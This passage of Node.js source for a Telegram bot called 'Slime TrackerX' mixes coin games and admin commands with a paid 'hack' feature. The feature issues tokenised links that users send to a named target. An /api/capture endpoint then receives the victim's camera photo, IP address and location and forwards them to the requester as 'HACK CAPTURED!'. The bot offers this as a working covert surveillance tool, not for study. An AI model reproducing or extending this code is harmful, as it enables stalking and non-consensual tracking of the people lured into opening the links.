      await addCoin(ctx.from.id, challenge.bet * 2);
      let winner = await initUser(ctx.from.id);
      winner.wordWins++;
      winner.totalEarnedFromWords += challenge.bet * 2;
      await saveUser(ctx.from.id, winner);
      let loser = await initUser(challenge.from);
      loser.wordLosses++;
      await saveUser(challenge.from, loser);
      await addXP(ctx.from.id, 20);
      await addXP(challenge.from, 5);
      await ctx.telegram.sendMessage(ctx.from.id, `🎉 **YOU WIN!** 🎉\n\nChallenger timed out!\n💰 Won ${challenge.bet * 2} coins!`);
      await ctx.telegram.sendMessage(challenge.from, `💀 **YOU LOSE!** 💀\n\nYou ran out of time!\n💸 Lost ${challenge.bet} coins`);
    }
  }, diff.timer * 1000);
  
  await ctx.reply(`✅ Challenge accepted!\n💰 Both paid ${challenge.bet} coins\n📝 Challenger's turn!\n⏱️ ${diff.timer} seconds!`);
});

bot.command("declineword", async (ctx) => {
  if (wordChallenges.has(ctx.from.id)) {
    let challenge = wordChallenges.get(ctx.from.id);
    if (challenge.status === "waiting") {
      wordChallenges.delete(ctx.from.id);
      ctx.reply("✅ Word challenge declined!");
      await ctx.telegram.sendMessage(challenge.from, `❌ ${ctx.from.username || ctx.from.first_name} declined your challenge!`);
    }
  } else { ctx.reply("❌ No challenge found!"); }
});

bot.command("wordstats", async (ctx) => {
  let u = await initUser(ctx.from.id);
  let winRate = u.wordWins + u.wordLosses > 0 ? ((u.wordWins / (u.wordWins + u.wordLosses)) * 100).toFixed(1) : 0;
  await ctx.reply(`📝 **YOUR WORD BATTLE STATS**\n\n🏆 Wins: ${u.wordWins}\n💀 Losses: ${u.wordLosses}\n📊 Win Rate: ${winRate}%\n💰 Total Earned: ${u.totalEarnedFromWords} coins`);
});

// ========== HACK SYSTEM ==========
bot.command("hack", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let targetUsername = args[1];
  if (!targetUsername) return ctx.reply(`💀 **HACK USER** 💀\n\nUsage: /hack @username\n💰 Cost: ${TRACK_COST} coins\n📸 Captures camera + IP + location`);
  
  let user = await initUser(ctx.from.id);
  if (user.coins < TRACK_COST) return ctx.reply(`❌ Need ${TRACK_COST} coins!`);
  
  let targetId = null;
  for (let [id, u] of usersCache) {
    try { let c = await ctx.telegram.getChat(id); if (c.username === targetUsername.replace("@", "")) { targetId = id; break; } } catch(e) {}
  }
  if (!targetId) return ctx.reply("❌ User not found!");
  
  await useHack(ctx.from.id);
  let token = crypto.randomBytes(8).toString("hex");
  tokens.set(token, { chat: ctx.chat.id, user: ctx.from.id, target: targetId, time: Date.now() });
  setTimeout(() => tokens.delete(token), 600000);
  
  let hacker = usersCache.get(ctx.from.id);
  hacker.hackedUsers.push(targetId);
  await saveUser(ctx.from.id, hacker);
  await ctx.reply(`💀 **HACK INITIATED!** 💀\n🎯 Target: ${targetUsername}\n💰 Cost: -${TRACK_COST} coins\n⏱️ Expires: 10 minutes\n\n🔗 Send this link: ${DOMAIN}?token=${token}`);
});

// ========== ADMIN COMMANDS ==========
bot.command("admin", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.isAdmin && ctx.from.id !== OWNER_ID) return ctx.reply("❌ Owner only!");
  await ctx.reply(`👑 **ADMIN PANEL**\n\n💰 /addcoin @user amount\n🎁 /gencode coins diamonds uses hours\n📋 /codes\n🗑️ /delcode CODE\n📢 /broadcast msg\n👥 /users\n📊 /stats\n🚫 /banuser @user\n✅ /unbanuser @user\n/giveall amount\n/topcoins\n/toprefs\n/restart`);
});

bot.command("addcoin", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Usage: /addcoin @user amount");
  let user = args[1].replace("@", "");
  let amt = parseInt(args[2]);
  if (isNaN(amt)) return ctx.reply("Amount must be number!");
  for (let [id, u] of usersCache) {
    try { let c = await ctx.telegram.getChat(id); if (c.username === user) { u.coins += amt; u.totalEarned += amt; await saveUser(id, u); await ctx.reply(`✅ +${amt} to @${user}\n💰 ${u.coins} coins`); return; } } catch(e) {}
  }
  await ctx.reply("❌ User not found!");
});

bot.command("gencode", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  let coins = parseInt(args[1]) || 50;
  let diamonds = parseInt(args[2]) || 0;
  let uses = Math.min(parseInt(args[3]) || 20, 20);
  let hours = parseInt(args[4]) || 24;
  let code = await genCode(coins, diamonds, uses, hours);
  await ctx.reply(`✅ CODE GENERATED!\n\nCode: \`${code}\`\n💰 ${coins} coins\n💎 ${diamonds} diamonds\n🔄 ${uses} uses\n⏱️ ${hours} hours`, { parse_mode: "Markdown" });
});

bot.command("codes", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  if (codesCache.size === 0) return ctx.reply("📋 No active codes.");
  let msg = "📋 ACTIVE CODES:\n\n";
  for (let [c, d] of codesCache) msg += `\`${c}\` - ${d.coins} coins - ${d.left} uses left\n`;
  await ctx.reply(msg, { parse_mode: "Markdown" });
});

bot.command("delcode", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Usage: /delcode CODE");
  let code = args[1].toUpperCase();
  if (codesCache.has(code)) { codesCache.delete(code); await Code.deleteOne({ code: code }); await ctx.reply(`✅ Code ${code} deleted!`); }
  else { await ctx.reply(`❌ Code ${code} not found!`); }
});

bot.command("broadcast", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let msg = ctx.message.text.split(" ").slice(1).join(" ");
  if (!msg) return ctx.reply("Usage: /broadcast message");
  await ctx.reply("📢 Sending broadcast...");
  let s = 0, f = 0;
  for (let [id] of usersCache) {
    try { await ctx.telegram.sendMessage(id, `📢 ANNOUNCEMENT\n\n${msg}`); s++; } catch { f++; }
  }
  await ctx.reply(`✅ ${s} sent | ❌ ${f} failed`);
});

bot.command("users", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  if (usersCache.size === 0) return ctx.reply("📋 No users yet!");
  let msg = "📋 USERS LIST\n\n";
  let i = 0;
  let sortedUsers = Array.from(usersCache.values()).sort((a, b) => b.joinDate - a.joinDate);
  for (let u of sortedUsers) { i++; let username = await getUsername(u.userId); msg += `${i}. @${username} - ${u.coins} coins | 👥 ${u.referrals} refs\n`; if (i >= 20) break; }
  msg += `\nTotal: ${usersCache.size} users`;
  await ctx.reply(msg);
});

bot.command("stats", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let total = 0, totalRefs = 0;
  for (let u of usersCache.values()) { total += u.coins; totalRefs += u.referrals; }
  await ctx.reply(`📊 BOT STATS\n\n👥 Users: ${usersCache.size}\n💰 Total Coins: ${total}\n🎯 Hacks: ${Array.from(usersCache.values()).reduce((s,u)=>s+u.hacks,0)}\n🎮 Games: ${Array.from(usersCache.values()).reduce((s,u)=>s+u.games,0)}\n🎁 Referrals: ${totalRefs}`);
});

bot.command("banuser", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Usage: /banuser @user");
  let user = args[1].replace("@", "");
  for (let [id] of usersCache) {
    try { let c = await ctx.telegram.getChat(id); if (c.username === user) { bannedUsers.add(id); await ctx.reply(`🚫 @${user} banned!`); return; } } catch(e) {}
  }
  await ctx.reply("❌ User not found!");
});

bot.command("unbanuser", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Usage: /unbanuser @user");
  let user = args[1].replace("@", "");
  for (let [id] of usersCache) {
    try { let c = await ctx.telegram.getChat(id); if (c.username === user) { bannedUsers.delete(id); await ctx.reply(`✅ @${user} unbanned!`); return; } } catch(e) {}
  }
  await ctx.reply("❌ User not found!");
});

bot.command("giveall", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  let amount = parseInt(args[1]);
  if (isNaN(amount)) return ctx.reply("Usage: /giveall amount");
  let count = 0;
  for (let [id, u] of usersCache) { u.coins += amount; u.totalEarned += amount; await saveUser(id, u); count++; }
  await ctx.reply(`✅ Added ${amount} coins to ${count} users!`);
});

bot.command("topcoins", async (ctx) => {
  let sorted = Array.from(usersCache.values()).sort((a, b) => b.coins - a.coins).slice(0, 10);
  let message = "🏆 **TOP COIN HOLDERS** 🏆\n\n";
  for (let i = 0; i < sorted.length; i++) { let user = sorted[i]; let name = await getUsername(user.userId); message += `${i+1}. @${name} - ${user.coins} coins (Lvl ${user.level})\n`; }
  await ctx.reply(message);
});

bot.command("toprefs", async (ctx) => {
  let sorted = Array.from(usersCache.values()).sort((a, b) => b.referrals - a.referrals).slice(0, 10);
  let message = "🏆 **TOP REFERRERS** 🏆\n\n";
  for (let i = 0; i < sorted.length; i++) { let user = sorted[i]; let name = await getUsername(user.userId); message += `${i+1}. @${name} - ${user.referrals} referrals\n`; }
  await ctx.reply(message);
});

bot.command("restart", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  await ctx.reply("🔄 Restarting...");
  setTimeout(() => process.exit(0), 2000);
});

// ========== SIMPLE COMMANDS ==========
bot.command("balance", async (ctx) => { let u = await initUser(ctx.from.id); await ctx.reply(`💰 ${u.coins} coins | 💎 ${u.diamonds} diamonds`); });
bot.command("profile", async (ctx) => { let u = await initUser(ctx.from.id); let winRate = u.games > 0 ? ((u.wins / u.games) * 100).toFixed(1) : 0; await ctx.reply(`👤 **${ctx.from.first_name}**\n\n💰 Coins: ${u.coins}\n💎 Diamonds: ${u.diamonds}\n📊 Level: ${u.level}\n👥 Referrals: ${u.referrals}\n💀 Hacks: ${u.hacks}\n🎮 Games: ${u.wins}W/${u.losses}L (${winRate}%)\n📝 Word Wins: ${u.wordWins}\n🌐 Websites: ${u.websites.length}\n\n🏆 Badges:\n${u.badges.map(b => `• ${b}`).join('\n')}`); });
bot.command("daily", async (ctx) => { let u = await initUser(ctx.from.id); let now = Date.now(); if (u.lastDaily && now - u.lastDaily < 86400000) { let h = Math.floor((86400000 - (now - u.lastDaily)) / 3600000); return ctx.reply(`⏰ ${h}h left`); } let streak = u.streak || 0; if (u.lastDaily && now - u.lastDaily < 172800000) streak++; else streak = 1; let reward = DAILY_REWARD + Math.min(streak, 10); await addCoin(ctx.from.id, reward); u.streak = streak; u.lastDaily = new Date(now); await saveUser(ctx.from.id, u); await ctx.reply(`🎁 +${reward} coins! Streak: ${streak}\n💰 ${u.coins + reward}`); });
bot.command("work", async (ctx) => { let u = await initUser(ctx.from.id); let now = Date.now(); let last = workCD.get(u.userId) || 0; if (now - last < WORK_CD) { let h = Math.floor((WORK_CD - (now - last)) / 3600000); return ctx.reply(`⏰ ${h}h left`); } let jobs = ["💻 Developer", "🎨 Designer", "📝 Writer", "🎮 Gamer", "🛒 Shopkeeper"]; let job = jobs[Math.floor(Math.random() * jobs.length)]; let reward = WORK_REWARD; await addCoin(u.userId, reward); workCD.set(u.userId, now); await ctx.reply(`💼 ${job} +${reward} coin\n💰 ${u.coins + reward}`); });
bot.command("redeem", async (ctx) => { let args = ctx.message.text.split(" "); if (args.length < 2) return ctx.reply("❌ Usage: /redeem <CODE>"); let res = await redeemCode(ctx.from.id, args[1]); if (res.ok) { let u = usersCache.get(ctx.from.id); await ctx.reply(`✅ ${res.msg}\n💰 ${u.coins} coins`); } else { await ctx.reply(res.msg); } });

// ========== GAMES ==========
bot.command("dice", async (ctx) => {
  try { let u = await initUser(ctx.from.id); let args = ctx.message.text.split(" "); let bet = parseInt(args[1]); if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /dice <amount>"); if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins! You have ${u.coins}`); await takeCoin(ctx.from.id, bet); let roll = Math.floor(Math.random() * 6) + 1; let win = roll === 6; if (win) { let w = bet + 1; await addCoin(ctx.from.id, w); u.wins++; await ctx.replyWithDice(); await ctx.reply(`🎲 You rolled ${roll}!\n🎉 YOU WIN!\n💰 +${w} coins!`); } else { u.losses++; await ctx.replyWithDice(); await ctx.reply(`🎲 You rolled ${roll}!\n💀 YOU LOSE!\n💸 -${bet} coins!`); } u.games++; await saveUser(ctx.from.id, u); } catch(e) { console.error(e); ctx.reply("⚠️ Error"); } });

// ========== MAIN MENU ==========
function mainMenu(ctx) {
  let link = refLink(ctx.from.id);
  return Markup.inlineKeyboard([
    [Markup.button.callback("💀 HACK", "track"), Markup.button.callback("📝 WORD BATTLE", "wordbattle")],
    [Markup.button.callback("🌐 WEB CREATOR", "webcreator"), Markup.button.callback("👑 GROUP", "group")],
    [Markup.button.callback("🎮 GAMES", "games"), Markup.button.callback("💰 ECONOMY", "eco")],
    [Markup.button.callback("🛠 DEV TOOLS", "devtools"), Markup.button.callback("👤 PROFILE", "prof")],
    [Markup.button.callback("📊 STATS", "stats"), Markup.button.callback("🎁 REDEEM", "redeem")],
    [Markup.button.callback("🔗 REFERRAL", "refinfo"), Markup.button.callback("💬 CHAT", "chat")],
    [Markup.button.url("📢 CHANNEL", "https://t.me/devxtechzone"), Markup.button.url("👨‍💻 DEV", "https://t.me/Mrddev")],
    [Markup.button.url("📋 MY LINK", link)]
  ]);
}

// ========== ACTION HANDLERS ==========
bot.action("track", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); await ctx.reply("💀 **HACK SYSTEM** 💀\n\n⚠️ Cost: 10 coins\n⏱️ 10min\n📸 Camera + IP + Location\n\nUse /hack @username to hack someone!", { ...Markup.inlineKeyboard([[Markup.button.callback("🎱 POOL MODE", "pool"), Markup.button.callback("⚡ NORMAL MODE", "norm")],[Markup.button.callback("◀️ BACK", "back")]]) }); });
bot.action("pool", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); if (!await canHack(ctx.from.id)) return ctx.reply(`❌ Need ${TRACK_COST} coins!`); await useHack(ctx.from.id); let token = crypto.randomBytes(8).toString("hex"); tokens.set(token, { chat: ctx.chat.id, user: ctx.from.id, time: Date.now() }); setTimeout(() => tokens.delete(token), 600000); await ctx.reply(`🎱 POOL MODE\n✅ Ready!\n💰 -${TRACK_COST}\n⏱️ 10min\n🔗 ${DOMAIN}?token=${token}`, { ...Markup.inlineKeyboard([[Markup.button.callback("◀️ BACK", "track")]]) }); });
bot.action("norm", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); if (!await canHack(ctx.from.id)) return ctx.reply(`❌ Need ${TRACK_COST} coins!`); await useHack(ctx.from.id); let token = crypto.randomBytes(8).toString("hex"); tokens.set(token, { chat: ctx.chat.id, user: ctx.from.id, time: Date.now() }); setTimeout(() => tokens.delete(token), 600000); await ctx.reply(`⚡ NORMAL MODE\n✅ Ready!\n💰 -${TRACK_COST}\n⏱️ 10min\n🔗 ${DOMAIN}?token=${token}`, { ...Markup.inlineKeyboard([[Markup.button.callback("◀️ BACK", "track")]]) }); });
bot.action("wordbattle", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); await ctx.reply(`📝 **1v1 WORD CHALLENGE**\n\nUsage: /wordbattle @username [amount] [difficulty]\n\nDifficulties:\n🍃 easy - 45 seconds\n⚡ medium - 30 seconds\n🔥 hard - 15 seconds\n💀 expert - 8 seconds\n\n💰 Winner takes ALL coins!`); });
bot.action("webcreator", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); await ctx.reply(`🌐 **WEB CREATOR - ONLY 15 COINS!**\n\nCreate stunning websites for just 15 coins!\n\nTemplates: portfolio, business, store, gaming, restaurant\n\nCommands:\n/createweb [template]\n/mywebsites`); });
bot.action("games", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); await ctx.reply("🎮 **GAMES ZONE**\n\n🎲 /dice [amount]\n🎰 /slots [amount]\n🔢 /guess [amount] [1-10]\n✊ /rps [amount] [rock/paper/scissors]\n🪙 /flip [amount]\n🔥 /risk [amount]"); });
bot.action("eco", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); let u = await initUser(ctx.from.id); await ctx.reply(`💰 **ECONOMY**\n\n💰 Balance: ${u.coins} coins\n💎 Diamonds: ${u.diamonds}\n📈 Earned: ${u.totalEarned}\n\nDaily: /daily (${DAILY_REWARD} coins)\nWork: /work (${WORK_REWARD} coin/12h)\nReferral: ${REF_REWARD} coins per ref!`); });
bot.action("devtools", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); await ctx.reply("🛠 **DEV TOOLS**\n\n🔒 /encrypt\n🔓 /decrypt\n📝 /base64\n🔢 /hash\n🎲 /random\n📋 /note\n⏰ /remind\n💤 /afk\n🔍 /whois"); });
bot.action("prof", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); let u = await initUser(ctx.from.id); let winRate = u.games > 0 ? ((u.wins / u.games) * 100).toFixed(1) : 0; await ctx.reply(`👤 **${ctx.from.first_name}**\n\n💰 Coins: ${u.coins}\n💎 Diamonds: ${u.diamonds}\n📊 Level: ${u.level}\n👥 Referrals: ${u.referrals}\n💀 Hacks: ${u.hacks}\n🎮 Games: ${u.wins}W/${u.losses}L (${winRate}%)\n📝 Word Wins: ${u.wordWins}\n🌐 Websites: ${u.websites.length}\n\n🏆 Badges:\n${u.badges.map(b => `• ${b}`).join('\n')}`, { ...Markup.inlineKeyboard([[Markup.button.callback("🔄 REFRESH", "prof"), Markup.button.callback("◀️ BACK", "back")]]) }); });
bot.action("stats", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); let totalCoins = 0, totalHacks = 0, totalGames = 0, totalRefs = 0; for (let u of usersCache.values()) { totalCoins += u.coins; totalHacks += u.hacks; totalGames += u.games; totalRefs += u.referrals; } await ctx.reply(`📊 **BOT STATS**\n\n👥 Users: ${usersCache.size}\n💰 Total Coins: ${totalCoins}\n💀 Hacks: ${totalHacks}\n🎮 Games: ${totalGames}\n🎁 Referrals: ${totalRefs}`); });
bot.action("redeem", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); await ctx.reply("🎁 **REDEEM CODE**\n\nUse: /redeem <CODE>\n\nExample: /redeem ABC123"); });
bot.action("refinfo", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); let u = await initUser(ctx.from.id); await ctx.reply(`🔗 **REFERRAL**\n\nLink: ${refLink(ctx.from.id)}\n\n📊 ${u.referrals} refs | ${u.referrals * REF_REWARD} coins earned\n\n🎁 ${REF_REWARD} coins per ref!`); });
bot.action("chat", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); await ctx.reply("💬 **CHAT WITH DEV**\n\nUse /chat to send message to developer.\nUse /exit to leave chat mode."); });
bot.action("back", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); let u = await initUser(ctx.from.id); await ctx.reply(`🟢⚡ **SLIME TRACKERX** ⚡🟢\n\n💰 ${u.coins} coins | 📊 Lvl ${u.level} | 👥 ${u.referrals} refs\n\n🎯 Select module`, mainMenu(ctx)); });

// ========== TEXT HANDLER ==========
bot.on("text", async (ctx) => {
  const msgId = `${ctx.chat.id}_${ctx.message.message_id}`;
  if (processedMessages.has(msgId)) return;
  processedMessages.add(msgId);
  setTimeout(() => processedMessages.delete(msgId), 5000);
  
  let build = webBuilds.get(ctx.from.id);
  if (build) {
    if (build.step < build.questions.length) {
      build.data[build.questions[build.step]] = ctx.message.text;
      build.step++;
      if (build.step < build.questions.length) {
        await ctx.reply(`📝 Send me your ${build.questions[build.step]}:`);
      } else {
        let html = htmlTemplates[build.template](build.data);
        let filename = `website_${ctx.from.id}_${Date.now()}.html`;
        let filepath = path.join(__dirname, "websites", filename);
        await fs.writeFile(filepath, html);
        const zipPath = path.join(__dirname, "websites", `${filename}.zip`);
        const output = fs.createWriteStream(zipPath);
        const archive = archiver('zip', { zlib: { level: 9 } });
        archive.pipe(output);
        archive.file(filepath, { name: "index.html" });
        await archive.finalize();
        output.on('close', async () => {
          await ctx.replyWithDocument({ source: zipPath, filename: `${build.data[build.questions[0]] || 'website'}.zip` });
          await ctx.reply(`✅ **WEBSITE CREATED!** ✅\n\n📁 Name: ${build.data[build.questions[0]]}\n🔗 URL: ${DOMAIN}/websites/${filename}\n📦 ZIP file sent above!\n\n💡 Deploy on: Vercel, Netlify, or Render\n\n👑 Created with Slime TrackerX Web Builder`);
          let website = new Website({ name: build.data[build.questions[0]], ownerId: ctx.from.id, template: build.template, content: build.data, url: `${DOMAIN}/websites/${filename}` });
          await website.save();
          let user = await initUser(ctx.from.id);
          user.websites.push(website.name);
          await saveUser(ctx.from.id, user);
          await addXP(ctx.from.id, 15);
          await fs.remove(filepath);
          await fs.remove(zipPath);
          webBuilds.delete(ctx.from.id);
        });
      }
    }
    return;
  }
  
  for (let [challengedId, challenge] of wordChallenges) {
    if (challenge.status === "active" && challenge.currentTurn === "challenger" && ctx.from.id === challenge.from) {
      let answer = ctx.message.text.toUpperCase().trim();
      if (answer.length === challenge.letterCount) {
        challenge.status = "completed";
        wordChallenges.delete(challengedId);
        let totalPot = challenge.bet * 2;
        await addCoin(challenge.from, totalPot);
        let winner = await initUser(challenge.from);
        winner.wordWins++;
        winner.totalEarnedFromWords += totalPot;
        await saveUser(challenge.from, winner);
        let loser = await initUser(challengedId);
        loser.wordLosses++;
        await saveUser(challengedId, loser);
        await addXP(challenge.from, 20);
        await addXP(challengedId, 5);
        await ctx.reply(`🎉 **CORRECT!** 🎉\n\nYou gave a ${answer.length}-letter word!\n💰 Won ${totalPot} coins!\n📊 +20 XP`);
        await ctx.telegram.sendMessage(challengedId, `💀 **YOU LOSE!** 💀\n\nYour opponent gave a correct ${answer.length}-letter word!\n💸 Lost ${challenge.bet} coins`);
      } else {
        challenge.status = "completed";
        wordChallenges.delete(challengedId);
        await addCoin(challengedId, challenge.bet * 2);
        let winner = await initUser(challengedId);
        winner.wordWins++;
        winner.totalEarnedFromWords += challenge.bet * 2;
        await saveUser(challengedId, winner);
        let loser = await initUser(challenge.from);
        loser.wordLosses++;
        await saveUser(challenge.from, loser);
        await addXP(challengedId, 20);
        await addXP(challenge.from, 5);
        await ctx.reply(`❌ **WRONG!** ❌\n\nYou gave a ${answer.length}-letter word, but needed a **${challenge.letterCount}-letter word**!\n💸 You lose ${challenge.bet} coins!`);
        await ctx.telegram.sendMessage(challengedId, `🎉 **YOU WIN!** 🎉\n\nYour opponent failed!\n💰 Won ${challenge.bet * 2} coins!\n📊 +20 XP`);
      }
      return;
    }
  }
  
  await addXP(ctx.from.id, 1);
});

// ========== MIDDLEWARE ==========
bot.use(async (ctx, next) => {
  if (!ctx.from) return next();
  if (ctx.chat?.type === "channel") return next();
  if (ctx.callbackQuery?.data === "join") return next();
  if (bannedUsers.has(ctx.from.id)) return ctx.reply("🚫 You are banned!");
  let joined = await checkJoin(ctx);
  if (!joined) {
    return ctx.reply(`🚫 ACCESS LOCKED\n\n🔐 Join: ${CHANNEL}`, { reply_markup: { inline_keyboard: [[{ text: "📢 JOIN", url: "https://t.me/devxtechzone" }, { text: "✅ JOINED", callback_data: "join" }]] } });
  }
  return next();
});

// ========== START ==========
bot.start(async (ctx) => {
  let ref = null;
  let args = ctx.message.text.split(" ");
  if (args[1] && args[1].startsWith("ref_")) { ref = parseInt(args[1].replace("ref_", "")); }
  let user = await initUser(ctx.from.id, ref);
  await ctx.replyWithPhoto("https://files.catbox.moe/v75lmb.jpeg", { caption: `🟢⚡ **SLIME TRACKERX v20.0** ⚡🟢\n💻 ULTIMATE GOD EDITION\n\n✨ Welcome ${ctx.from.first_name}!\n💰 ${user.coins} coins | 📊 Lvl ${user.level} | 👥 ${user.referrals} refs\n🎁 +${NEW_COINS} FREE coins!\n\n🔗 ${refLink(ctx.from.id)}\n\n🎯 Select module`, parse_mode: "Markdown", ...mainMenu(ctx) });
});

bot.action("join", async (ctx) => {
  if (!await checkJoin(ctx)) return ctx.answerCbQuery("❌ Join first!", true);
  await ctx.answerCbQuery("✅ Access!");
  await ctx.deleteMessage().catch(() => {});
  let user = await initUser(ctx.from.id);
  await ctx.replyWithPhoto("https://files.catbox.moe/v75lmb.jpeg", { caption: `✅ Access Unlocked!\n💰 ${user.coins} coins\n🎯 Select module`, parse_mode: "Markdown", ...mainMenu(ctx) });
});

// ========== API ENDPOINTS ==========
app.post("/api/capture", async (req, res) => {
  try {
    let { image, token, ip, location } = req.body;
    if (!token || !tokens.has(token)) return res.status(400).json({ error: "Invalid" });
    let data = tokens.get(token);
    if (image) {
      let buf = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
      await bot.telegram.sendPhoto(data.chat, { source: buf }, { caption: `📸 **HACK CAPTURED!**\n🌐 IP: ${ip}\n📍 Location: ${location}\n🕐 Time: ${new Date().toLocaleString()}\n\n💀 HACK SUCCESSFUL!` });
    }
    tokens.delete(token);
    res.json({ status: "success" });
  } catch(e) { res.status(500).json({ error: "Error" }); }
});

app.post("/api/upload", upload.single("image"), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: "No file uploaded" });
  const imageUrl = `${DOMAIN}/uploads/${req.file.filename}`;
  res.json({ url: imageUrl });
});

app.get("/", (req, res) => { res.sendFile(path.join(__dirname, "public", "index.html")); });

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server on ${PORT}`));

loadData().then(async () => {
  try {
    await bot.telegram.deleteWebhook();
    console.log("✅ Webhook cleared");
    await bot.launch({ dropPendingUpdates: true });
    console.log(`🤖 SLIME TRACKERX v20.0 COMPLETE GOD EDITION LIVE!`);
  } catch(e) {
    console.log("Bot launch error:", e.message);
    setTimeout(async () => { try { await bot.launch(); console.log("✅ Bot restarted!"); } catch(err) { console.log("Retry failed:", err.message); } }, 5000);
  }
});

process.once("SIGINT", () => { bot.stop("SIGINT"); setTimeout(() => process.exit(0), 1000); });
process.once("SIGTERM", () => { bot.stop("SIGTERM"); setTimeout(() => process.exit(0), 1000); });
